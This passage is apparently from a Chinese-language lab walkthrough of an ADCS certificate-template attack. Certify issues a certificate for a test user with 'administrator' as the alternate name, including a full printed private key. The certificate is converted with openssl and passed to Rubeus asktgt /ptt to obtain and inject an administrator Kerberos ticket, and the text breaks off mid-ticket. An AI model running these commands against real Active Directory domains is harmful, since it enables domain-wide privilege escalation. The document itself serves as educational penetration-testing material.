+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Subject                 : CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;testuser, CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Users, DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;wackadcs, DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;com
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; AltName                 : administrator
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Certificate Authority   : dc.wackadcs.com&lt;span style=&#34;color:#ae81ff&#34;&gt;\w&lt;/span&gt;ackadcs-DC-CA
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; CA Response             : The certificate had been issued.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Request ID              : &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; cert.pem         :
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-----BEGIN RSA PRIVATE KEY-----
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;MIIEpAIBAAKCAQEAx96DY8qk0ZekO+1NVRo+KT9iZf8BATvKqZ5xyfVm26uZAcPJ
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;D3nj6DMxH41b6RK1IpJpKct+dwD9R4Fca3uP2SAxiFxY5iMigd3I/1nHpZO3X/DS
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0XPwVY0VeCDgFtDtqKMrQsTcQgzTcrwL5SWE+96E5Qk6lLhsbx/ZSlO2ncKRnx+F
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;heuN7gnA4qn1TWgZf0BTU1xKfxB5UqVS8fF7IEo/kkKSTm14w//8R27Ua6yarEbB
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sjMF3oHj+FxnL7fkvVFTmto5hCaTUzdxcSOdF8dx0oKperulzItnasmKtCxUO2w4
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;WKBrNMMsRwAh0q/nWRQwOquJbc/0aGod7u7RlQIDAQABAoIBAErbulZL9cNSin6v
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;eIFhXNrSFKajBdtSa6tv3qqHsUihUqNokwuq2YOEeOeaaEw5Z4JVV/IBd5JW2oZH
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mzfehZgLCMJL5Df9/NSrHrcVB0OqucnDRxKP2/oO53Wgyo2BHyJEStWtKdnLN/8H
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;E2V10gML6rZl6Hz/Pg243geKpyEarrhBHBP7W/u1iUs0ySpV4SxFOh4dFTWJmMWM
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GfuVUU7BTU8OZwQUkyB9LbrT+q3p0DUgVx7zLlqbC1MzbjP61jQ5JAm3ep6Vq/Yb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NiPnQVbeHbMQjqjOqDm0zEV5QYQtVVA+aRd/5FzwmmI0VRz1lTWBUXwwdCYEHcWZ
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;jcSD8FkCgYEA9P7Q3Icrcbin4El/rAZVHqpHuALtzClSOjYBLmfUvd8Fq8TmEiZ/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2nbXXThV/U5qIxgkRSVHvCNGZelLPJN5r4dUJyy9kumxHYIJfER/LW+5A1KGC86k
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tgkfIRmDzT9Nu8Z5npHa0L2LYR+c/rTFZKtSQAjVEjNkdavYwdmyvLsCgYEA0NjL
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bxm/YWgoW/MQ1aqfTVOvI1IGdPZ+VPsXVHSX4VxbasTqobZ16wJLE+jtsEa+HeWa
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;fA6oXAGDD0Z1y6V4/GwVKI/zLhSgMbcoB/+NSnFu0HDHLbV2WtPpXXfIXk361/ns
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;5G5XWGBYvJYDzHoQHftjdVzECzzA2fnWTftPbe8CgYEAolS0z2pAvvk7QsFwdus7
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;OzZYjvRh3AUFFszxu23Q6H39o/Ky/xPDY12bFYlecJiketxkK+ynu2EkJCKQV3Lg
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Dg39FHfwpIdzc7nVzyETo2eDj0/+wZQKTxN8LNJbIoPvXZwEuayq7+SnlZL800e0
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;AyABP6yagZTL26wh01ALvkECgYBJuj8XGZ/WY07cJxLqWzGhusk5Ttu4rswqc/no
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dsCnblNXfezW6fL24/hdLv26HT9Ajq3a3dHRqTb7TYSIQAJWGlHd3/OZcO6cnmwj
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ZrQac7ELJMUr/cOqjOT1ejPiFuVXGYPnoIx1Ro4NBWiR5wWJkBWsePM8hFYQnYJq
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RS3lQQKBgQCZKFzAz4pWFRtrpNNUvOHRd6WBLAYNiGuGe/IKniQeUZRtkJaHQdXv
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;jwSBlXfmUGetfY8D5nlD6fybxUYf0Osgb7WAy/wQSYUWfGyw3k62B1+a8l8rpMSI
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/2eWgG/BwJxu7z07mb4Z0Zp+V9a3R7yxc0PV1/VEwGucFFEXSsXhPA&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-----END RSA PRIVATE KEY-----
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-----BEGIN CERTIFICATE-----
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;MIIFpzCCBI+gAwIBAgITRwAAAAiztITCzCjvHwAAAAAACDANBgkqhkiG9w0BAQsF
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ADBIMRMwEQYKCZImiZPyLGQBGRYDY29tMRgwFgYKCZImiZPyLGQBGRYId2Fja2Fk
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Y3MxFzAVBgNVBAMTDndhY2thZGNzLURDLUNBMB4XDTI1MDgyOTEwNTMxMFoXDTI2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;MDgyOTEwNTMxMFowUjETMBEGCgmSJomT8ixkARkWA2NvbTEYMBYGCgmSJomT8ixk
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ARkWCHdhY2thZGNzMQ4wDAYDVQQDEwVVc2VyczERMA8GA1UEAxMIdGVzdHVzZXIw
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDH3oNjyqTRl6Q77U1VGj4p
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;P2Jl/wEBO8qpnnHJ9Wbbq5kBw8kPeePoMzEfjVvpErUikmkpy353AP1HgVxre4/Z
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;IDGIXFjmIyKB3cj/Wcelk7df8NLRc/BVjRV4IOAW0O2ooytCxNxCDNNyvAvlJYT7
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;3oTlCTqUuGxvH9lKU7adwpGfH4WF643uCcDiqfVNaBl/QFNTXEp/EHlSpVLx8Xsg
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Sj+SQpJObXjD//xHbtRrrJqsRsGyMwXegeP4XGcvt+S9UVOa2jmEJpNTN3FxI50X
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;x3HSgql6u6XMi2dqyYq0LFQ7bDhYoGs0wyxHACHSr+dZFDA6q4ltz/Roah3u7tGV
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;AgMBAAGjggJ+MIICejA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiDxo8/g+L0
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;AYGxix2Hm8gOhp6HRGud+qVSl9vWTAIBZAIBBDATBgNVHSUEDDAKBggrBgEFBQcD
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;AjAOBgNVHQ8BAf8EBAMCB4AwGwYJKwYBBAGCNxUKBA4wDDAKBggrBgEFBQcDAjAd
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BgNVHQ4EFgQUemYdeXrgkaNdHVKuML4ES+6js+cwKAYDVR0RBCEwH6AdBgorBgEE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;AYI3FAIDoA8MDWFkbWluaXN0cmF0b3IwHwYDVR0jBBgwFoAUHiNq67IPqjWhNvQo
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ARl4Yl+qc6IwgcgGA1UdHwSBwDCBvTCBuqCBt6CBtIaBsWxkYXA6Ly8vQ049d2Fj
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a2FkY3MtREMtQ0EsQ049ZGMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9d2Fja2FkY3MsREM9
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Y29tP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1j
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;UkxEaXN0cmlidXRpb25Qb2ludDCBwQYIKwYBBQUHAQEEgbQwgbEwga4GCCsGAQUF
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BzAChoGhbGRhcDovLy9DTj13YWNrYWRjcy1EQy1DQSxDTj1BSUEsQ049UHVibGlj
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;JTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Qz13YWNrYWRjcyxEQz1jb20/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNz
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PWNlcnRpZmljYXRpb25BdXRob3JpdHkwDQYJKoZIhvcNAQELBQADggEBAAXl5dhO
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;r0TQawv3i8jtRKNYDbbuMhyldqnMmyk7FEm8xGcT54pKMSNejMg0VtuNT/KvZBqP
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;oonOEPh2ZHoh03MVtklBRoR9YtaxbZPC7JEydM+pAy+OOS64m+E0+S7Ox5Xt8ZA2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;HqXIWCaVuvlPty33lH1YiQhW81e3SaeRXuBDA56VFNijlFogvjrI1MNi7EOurQMb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Hxu0/zUr6TZOaboIwEavzvy2eNfv5f8bxFYRI9tmpt+4U6HLFlPoPQ/7S/m3boNS
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Su1pp4C+PKflGlp/5jAyDvRLsm3CiAZRaO70vLUvmttoElHPU/XGUrI4F/u0iV1R
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;UeXZ3nCktWcfXoo&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-----END CERTIFICATE-----
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Convert with: openssl pkcs12 -in cert.pem -keyex -CSP &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Microsoft Enhanced Cryptographic Provider v1.0&amp;#34;&lt;/span&gt; -export -out cert.pfx
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Certify completed in 00:00:03.8674143
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;复制完整的证书转换格式，并录入证书密钥&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/synthetic/adcs-test&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ openssl pkcs12 -in cert.pem -keyex -CSP &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Microsoft Enhanced Cryptographic Provider v1.0&amp;#34;&lt;/span&gt; -export -out cert.pfx
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Enter Export Password:123456
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Verifying - Enter Export Password:123456
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将生成的证书传回目标并用Rubeus利用pkinit请求tgt并注入当前会话&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil-winrm-py PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;estuser&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; .&lt;span style=&#34;color:#ae81ff&#34;&gt;\R&lt;/span&gt;ubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:123456 /ptt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   ______        _                      
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;_____ &lt;span style=&#34;color:#ae81ff&#34;&gt;\ &lt;/span&gt;     | |                     
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   _____&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;_   _| |__  _____ _   _  ___ 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  |  __  /| | | |  _ &lt;span style=&#34;color:#ae81ff&#34;&gt;\|&lt;/span&gt; ___ | | | |/___&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  | |  &lt;span style=&#34;color:#ae81ff&#34;&gt;\ \|&lt;/span&gt; |_| | |_&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; ____| |_| |___ |
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  |_|   |_|____/|____/|_____&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;____/&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;___/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v1.6.4 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Action: Ask TGT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Using PKINIT with etype rc4_hmac and subject: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;testuser, CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Users, DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;wackadcs, DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;com 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Building AS-REQ &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;w/ PKINIT preauth&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wackadcs.com\administrator&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; TGT request successful!
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ticket.kirbi&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      doIFzDCCBcigAwIBBaEDAgEWooIE3DCCBNhhggTUMIIE0KADAgEFoQ4bDFdBQ0tBRENTLkNPTaIhMB+g
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      AwIBAqEYMBYbBmtyYnRndBsMd2Fja2FkY3MuY29to4IElDCCBJCgAwIBEqEDAgECooIEggSCBH69O4aY
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      cdHlYpgzQPr73+J9XmXoRmCqA/Wki5r+CMbIMLvueqnCpjch6rrZgoRF95qgQxsEVstY8HYMJrzTBOPN
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      onZMbl6pgzqV8QeTN3p/awlUIO8ac0SsDPH2YTLl/mFHBoohSqTfCKQ1Gn5/q+CsPZOaf5CLPWJoBOiB
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      C5bDapEI2GUN4dafAgGoj0GAF9TJr19j8IkwPlQy14hohErsMGIWot2N7iuYJLb4ERWYnClPsP4z9kxe
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      wCD41vGdxMt0/7eMYd/TeDbh13Ilx0QNkSBWtHwCD3LRfaDKHbXO6oZb2kbNME7vHJxFkcAemWEzAp+0
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      /PekCxQRGxmYFVIheE/VJJu/RTJB8l3tRw+fw1GpXOepKQsPQMwTT8YZBrthPLy4qjBIjQNNKC/67e1s
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      Kni5m3rnsK06eS++Zj4AyFKmq+4Vy43cqOAUGdL5nreySvceJmbNBJkHe+Dm7ClKk32/n4SnhS0x9uV2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      JjSzy3uSA2xpCjHBxtZUGGsxU82W947QU528OjKDS+vjMuJN+5eszcaCs96pmK3vWZNAhIImt5gj+sbV
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      LzhnnDiuOBSF2SQHfM+NPYuci4G0zUmUcy9pZv3to3pKpD7ZuYwntlkM5rBqZRT8P8gbnrgpnWwc5rg/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      eQDyeznTkdEvPhyllcU72wn6ylS9i/FDl+U9S8VNEE+IwGYDippaL/TTWAuythmLg7+9VF5HSwnRp1ba
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      7NMxeC9EXKLBd3i2nZH5uZ1Bh9YdjAWW86XRiw2BYektqNlea5t2eEmEUnO0ToMm7ZpYNIsCuHQuT0mZ
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      DIRLMiLskNHTVuthsoADqOBTa8fsliEerCUYPE7fmsQgft9c4nbLul/3GfT4QecAJgxTjL6bLhokKPAz
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      1iPdcSQY0VdrBXm3IoMSy+oTqSu6Y7vwywbO8qNiN8Xh4ZeILTb3pTj5iU8SxyxEdyk6w4KcseD/J0Ik
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      4fu2aUf5l+xpg6Acr6JlVndzFOmXtxMIsEPhs6DdlzKw0NdtHE82hX9TCmFLsS62zGcf0mfxrpOCSwq6
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      Tg95Zwu9WVLAl2rfaF8ZDrInjbzEW73rsZmIw6cbJ0c0a/GxB+3LONEZ4MRPHwPIAClYVMzisx2++CK4
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      WnNkHSYX/ixqSLGxz0U6ta/bPz1aT8uAfyRG43Zt5lStEX+BFfcPjmv0oxDVnoxPOQKI4tCxjwlSTbqR
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      VTursusFJ5/6X54BV0tDOvYp4gqdEy4+Qx2/2JihaVgd6+9M0dHZBeWhCFj1xew29ysl+Q80R1CvJ78l
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      qCFhAfCF6wA1BBpgLdJaEuszFtxAr8BKdzPN0ksoWTJIYLSGcfogvRAcLpj2E+dlvO61YxAx1qjQSC97
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      zeK5khB4ApzVP890GNrdSzubkztEBZ811IjauCOw8uERNzlayNd2f5AnTn+EfIUDp4dek/ixTDGCTFV8
